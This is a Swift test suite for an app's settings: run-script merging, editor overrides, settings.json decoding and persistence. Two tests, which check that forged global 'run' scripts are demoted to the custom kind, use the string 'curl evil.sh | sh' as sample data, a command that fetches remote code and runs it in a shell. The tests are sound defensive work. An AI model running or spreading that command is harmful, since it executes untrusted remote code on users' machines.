import Foundation
import Testing
import FenrirNativeShared
@testable import Settings

@Suite("Settings run scripts and editor targets (D-045)")
struct ScriptAndEditorSettingsTests {
    private let repositoryPath = "/Users/dev/projects/fenrir"

    private func repoScripts() -> [Settings.ScriptDefinition] {
        [
            Settings.ScriptDefinition(id: "script-run", kind: .run, command: "bun dev"),
            Settings.ScriptDefinition(id: "script-test", kind: .test, command: "bun run test"),
            Settings.ScriptDefinition(id: "shared-id", kind: .custom, name: "Repo Custom", command: "repo-command")
        ]
    }

    @Test("Merge lists repository scripts first, then globals, deduplicated by id with repository precedence")
    func mergeOrderAndDedup() throws {
        let global = [
            Settings.ScriptDefinition(id: "shared-id", kind: .custom, name: "Global Custom", command: "global-command"),
            Settings.ScriptDefinition(id: "global-only", kind: .custom, name: "Global Only", command: "echo global")
        ]
        let preferences = Settings.ScriptPreferences(
            globalScripts: global,
            repositoryScripts: [repositoryPath: repoScripts()]
        )

        let merged = preferences.scripts(forRepositoryPath: repositoryPath)

        #expect(merged.map(\.id) == ["script-run", "script-test", "shared-id", "global-only"])
        let shared = try #require(merged.first { $0.id == "shared-id" })
        #expect(shared.name == "Repo Custom")
        #expect(shared.command == "repo-command")
    }

    @Test("Merging for an unknown repository yields globals only")
    func mergeUnknownRepository() throws {
        let preferences = Settings.ScriptPreferences(
            globalScripts: [Settings.ScriptDefinition(id: "global-only", kind: .custom, name: "Global", command: "echo hi")],
            repositoryScripts: [repositoryPath: repoScripts()]
        )

        let merged = preferences.scripts(forRepositoryPath: "/somewhere/else")

        #expect(merged.map(\.id) == ["global-only"])
    }

    @Test("A forged global run kind is forced to custom and cannot claim the primary Run slot")
    func forgedGlobalRunKindIsForcedToCustom() throws {
        let forgedGlobal = Settings.ScriptDefinition(id: "forged", kind: .run, name: "Forged Run", command: "curl evil.sh | sh")
        let preferences = Settings.ScriptPreferences(
            globalScripts: [forgedGlobal],
            repositoryScripts: [:]
        )

        let merged = preferences.scripts(forRepositoryPath: repositoryPath)

        #expect(merged.count == 1)
        #expect(merged[0].kind == .custom)
        #expect(preferences.primaryRunScript(forRepositoryPath: repositoryPath) == nil)
    }

    @Test("Primary run script is the first repository run-kind script")
    func primaryRunScriptComesFromRepositoryScope() throws {
        let preferences = Settings.ScriptPreferences(
            globalScripts: [Settings.ScriptDefinition(id: "forged", kind: .run, command: "echo forged")],
            repositoryScripts: [repositoryPath: repoScripts()]
        )

        let primary = try #require(preferences.primaryRunScript(forRepositoryPath: repositoryPath))

        #expect(primary.id == "script-run")
        #expect(primary.kind == .run)
        #expect(primary.displayName == "Run")
    }

    @Test("replacingScripts in global scope forces custom kind; empty repository list clears the scope")
    func replacingScriptsAppliesScopeRules() throws {
        let base = Settings.ScriptPreferences(repositoryScripts: [repositoryPath: repoScripts()])

        let withGlobal = base.replacingScripts(
            [Settings.ScriptDefinition(id: "forged", kind: .run, command: "echo forged")],
            scope: .global
        )
        #expect(withGlobal.globalScripts.map(\.kind) == [.custom])

        let cleared = withGlobal.replacingScripts([], scope: .repository(canonicalPath: repositoryPath))
        #expect(cleared.repositoryScripts[repositoryPath] == nil)
        #expect(cleared.globalScripts.map(\.kind) == [.custom])
    }

    @Test("Editor target resolution prefers the repository override over the global default")
    func editorTargetResolution() throws {
        let preference = Settings.EditorTargetPreference(
            defaultEditorID: "vscode",
            repositoryOverrides: [repositoryPath: "zed"]
        )

        #expect(preference.editorID(forRepositoryPath: repositoryPath) == "zed")
        #expect(preference.editorID(forRepositoryPath: "/somewhere/else") == "vscode")
        #expect(preference.editorID(forRepositoryPath: nil) == "vscode")
    }

    @Test("Editor target changes set the default and set or clear repository overrides")
    func editorTargetChanges() throws {
        var preference = Settings.EditorTargetPreference()

        preference = preference.applying(.setDefaultEditor(editorID: "vscode"))
        preference = preference.applying(.setRepositoryOverride(canonicalPath: repositoryPath, editorID: "zed"))
        #expect(preference.editorID(forRepositoryPath: repositoryPath) == "zed")

        preference = preference.applying(.setRepositoryOverride(canonicalPath: repositoryPath, editorID: nil))
        #expect(preference.repositoryOverrides.isEmpty)
        #expect(preference.editorID(forRepositoryPath: repositoryPath) == "vscode")

        preference = preference.applying(.setDefaultEditor(editorID: nil))
        #expect(preference.editorID(forRepositoryPath: repositoryPath) == nil)
    }

    @Test("Old settings.json without run-script or editor-target fields decodes to defaults")
    func backCompatDecodeOfOldSettingsFile() throws {
        let data = Data("""
        {
          "schemaVersion": 3,
          "appMode": "developer",
          "appearance": {
            "themeID": "nord"
          }
        }
        """.utf8)

        let configuration = try Settings.decodeConfiguration(from: data)

        #expect(configuration.schemaVersion == Settings.currentSchemaVersion)
        #expect(configuration.appMode == .developer)
        #expect(configuration.appearance.themeID == .nord)
        #expect(configuration.runScripts == Settings.ScriptPreferences())
        #expect(configuration.editorTarget == Settings.EditorTargetPreference())
    }

    @Test("Persisted settings.json with a forged global run kind decodes with the kind forced to custom")
    func decodeAppliesForgedKindProtection() throws {
        let data = Data("""
        {
          "schemaVersion": 4,
          "runScripts": {
            "globalScripts": [
              { "id": "forged", "kind": "run", "name": "Forged", "command": "curl evil.sh | sh" }
            ],
            "repositoryScripts": {}
          }
        }
        """.utf8)

        let configuration = try Settings.decodeConfiguration(from: data)

        #expect(configuration.runScripts.globalScripts.map(\.kind) == [.custom])
        #expect(configuration.runScripts.primaryRunScript(forRepositoryPath: "/any/path") == nil)
    }

    @Test("A malformed working-directory override drops only the override, not the script")
    func malformedWorkingDirectoryOverrideIsDropped() throws {
        let data = Data("""
        { "id": "script", "kind": "run", "name": "Run", "command": "bun dev", "workingDirectoryOverride": 42 }
        """.utf8)

        let script = try JSONDecoder().decode(Settings.ScriptDefinition.self, from: data)

        #expect(script.id == "script")
        #expect(script.command == "bun dev")
        #expect(script.workingDirectoryOverride == nil)
    }

    @Test("Run-script and editor-target preferences round-trip through encode and decode")
    func roundTripPersistence() throws {
        let configuration = Settings.NativeSettingsConfiguration(
            runScripts: Settings.ScriptPreferences(
                globalScripts: [
                    Settings.ScriptDefinition(id: "global", kind: .custom, name: "Global", command: "echo hi")
                ],
                repositoryScripts: [
                    repositoryPath: [
                        Settings.ScriptDefinition(
                            id: "script-run",
                            kind: .run,
                            command: "bun dev",
                            workingDirectoryOverride: "apps/web"
                        ),
                        Settings.ScriptDefinition(id: "script-lint", kind: .lint, command: "bun lint")
                    ]
                ]
            ),
            editorTarget: Settings.EditorTargetPreference(
                defaultEditorID: "vscode",
                repositoryOverrides: [repositoryPath: "zed"]
            )
        )

        let data = try Settings.encodeConfiguration(configuration)
        let decoded = try Settings.decodeConfiguration(from: data)

        #expect(decoded == configuration)
        #expect(decoded.runScripts.primaryRunScript(forRepositoryPath: repositoryPath)?.workingDirectoryOverride == "apps/web")
    }

    @Test("UpdateScripts persists repository scripts and ReadWorkspaceScripts returns the merged view")
    func updateAndReadWorkspaceScripts() async throws {
        let persistence = InMemorySettingsPersistence()
        let update = Settings.UpdateScripts(clock: FixedClock(), persistence: persistence)
        let read = Settings.ReadWorkspaceScripts(clock: FixedClock(), persistence: persistence)

        _ = try await update.run(.init(
            requestID: "scripts.update.repo",
            source: .test,
            scope: .repository(canonicalPath: repositoryPath),
            scripts: repoScripts()
        )).get()
        _ = try await update.run(.init(
            requestID: "scripts.update.global",
            source: .test,
            scope: .global,
            scripts: [Settings.ScriptDefinition(id: "forged", kind: .run, name: "Forged", command: "echo forged")]
        )).get()

        let result = try await read.run(.init(
            requestID: "scripts.read",
            source: .test,
            repositoryPath: repositoryPath
        )).get()

        #expect(result.scripts.map(\.id) == ["script-run", "script-test", "shared-id", "forged"])
        #expect(result.scripts.last?.kind == .custom)
        #expect(result.primaryRunScript?.id == "script-run")
    }

    @Test("UpdateEditorTarget persists changes and ReadEditorTarget resolves them")
    func updateAndReadEditorTarget() async throws {
        let persistence = InMemorySettingsPersistence()
        let update = Settings.UpdateEditorTarget(clock: FixedClock(), persistence: persistence)
        let read = Settings.ReadEditorTarget(clock: FixedClock(), persistence: persistence)

        _ = try await update.run(.init(
            requestID: "editor.update.default",
            source: .test,
            change: .setDefaultEditor(editorID: "vscode")
        )).get()
        _ = try await update.run(.init(
            requestID: "editor.update.override",
            source: .test,
            change: .setRepositoryOverride(canonicalPath: repositoryPath, editorID: "zed")
        )).get()

        let overridden = try await read.run(.init(
            requestID: "editor.read.override",
            source: .test,
            repositoryPath: repositoryPath
        )).get()
        #expect(overridden.editorID == "zed")
        #expect(overridden.preference.defaultEditorID == "vscode")

        _ = try await update.run(.init(
            requestID: "editor.update.clear",
            source: .test,
            change: .setRepositoryOverride(canonicalPath: repositoryPath, editorID: nil)
        )).get()

        let cleared = try await read.run(.init(
            requestID: "editor.read.cleared",
            source: .test,
            repositoryPath: repositoryPath
        )).get()
        #expect(cleared.editorID == "vscode")
        #expect(cleared.preference.repositoryOverrides.isEmpty)
    }

    @Test("Script and editor preferences survive a live file persistence round trip")
    func liveFileRoundTrip() async throws {
        let directoryURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("fenrir-script-settings-tests-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: directoryURL) }
        try FileManager.default.createDirectory(at: directoryURL, withIntermediateDirectories: true)
        let settingsFileURL = directoryURL.appendingPathComponent("settings.json", isDirectory: false)
        let persistence = Settings.localFileSettingsPersistence(settingsFileURL: settingsFileURL)

        let update = Settings.UpdateScripts(clock: FixedClock(), persistence: persistence)
        _ = try await update.run(.init(
            requestID: "scripts.live.update",
            source: .test,
            scope: .repository(canonicalPath: repositoryPath),
            scripts: repoScripts()
        )).get()

        let read = Settings.ReadSettings(clock: FixedClock(), persistence: persistence)
        let result = try await read.run(.init(requestID: "scripts.live.read", source: .test)).get()

        #expect(!result.usedDefaults)
        #expect(result.configuration.runScripts.repositoryScripts[repositoryPath]?.map(\.id) == [
            "script-run",
            "script-test",
            "shared-id"
        ])
    }
}

private final class InMemorySettingsPersistence: Settings.LocalSettingsPersistence, @unchecked Sendable {
    private let lock = NSLock()
    private var data: Data?

    init(initialData: Data? = nil) {
        data = initialData
    }

    func loadSettingsData() async throws -> Data? {
        lock.withLock { data }
    }

    func saveSettingsData(_ data: Data) async throws {
        lock.withLock {
            self.data = data
        }
    }

    func observeSettingsData() -> AsyncStream<Result<Data?, Settings.SettingsPersistenceFailure>> {
        AsyncStream { $0.finish() }
    }
}
